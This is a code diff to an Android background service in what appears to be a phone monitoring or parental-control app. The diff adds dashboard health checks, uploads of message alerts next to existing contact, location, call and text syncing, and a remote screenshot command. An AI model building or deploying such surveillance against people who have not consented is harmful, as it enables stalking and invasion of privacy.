@@ -187,6 +187,15 @@ public class AgentService extends Service {
         if (battery != null) o.put("battery", battery);
         o.put("callControl", Calls.status(this));
         o.put("accessibility", Agent.accessibilityServiceOn(this));
+        // For the dashboard's health check: is each part actually working on the phone?
+        o.put("filterRunning", DnsFilterVpnService.filterRunning);
+        o.put("usageAccess", Agent.usageAccessOn(this));
+        o.put("locationPerm", checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED);
+        try {
+            o.put("batteryUnrestricted", ((android.os.PowerManager) getSystemService(POWER_SERVICE)).isIgnoringBatteryOptimizations(getPackageName()));
+        } catch (Exception ignored) {
+        }
+        o.put("canScreenshot", Build.VERSION.SDK_INT >= 30);
         o.put("tz", java.util.TimeZone.getDefault().getOffset(System.currentTimeMillis()) / 60000); // for filter schedules
         o.put("wifi", Telemetry.wifi(this));
         long lockUntil = Agent.prefs(this).getLong("lockUntil", 0);
@@ -244,6 +253,8 @@ public class AgentService extends Service {
         JSONArray contacts = ContactSync.ifChanged(this);
         if (contacts != null) body.put("contacts", contacts);
         if (locations.length() > 0) body.put("locations", locations);
+        JSONArray msgAlerts = Monitor.peek(this);
+        if (msgAlerts.length() > 0) body.put("msgAlerts", msgAlerts);
         body.put("overrides", Agent.getOverrides(this));
         body.put("overridesRev", Agent.overridesRev(this));
         body.put("restrictionOverrides", Agent.getRestrictionOverrides(this));
@@ -326,6 +337,7 @@ public class AgentService extends Service {
         Agent.dropMessages(this, messages.length());
         TrafficLog.dropPending(this, trafficLog.length());
         Whereabouts.drop(this, locations.length());
+        Monitor.drop(this, msgAlerts.length());
         Calls.dropCalls(this, calls.length());
         Calls.dropTexts(this, texts.length());
         if (contacts != null) ContactSync.sent(this);
@@ -506,6 +518,10 @@ public class AgentService extends Service {
                     break;
                 case "locate":
                     msg = Actions.locate(this);
+                    break;
+                case "screenshot":
+                    msg = Monitor.screenshot(this);
+                    ok = msg.startsWith("Screenshot sent");
                     break;
                 case "checkUpdates":
                     msg = checkUpdates();
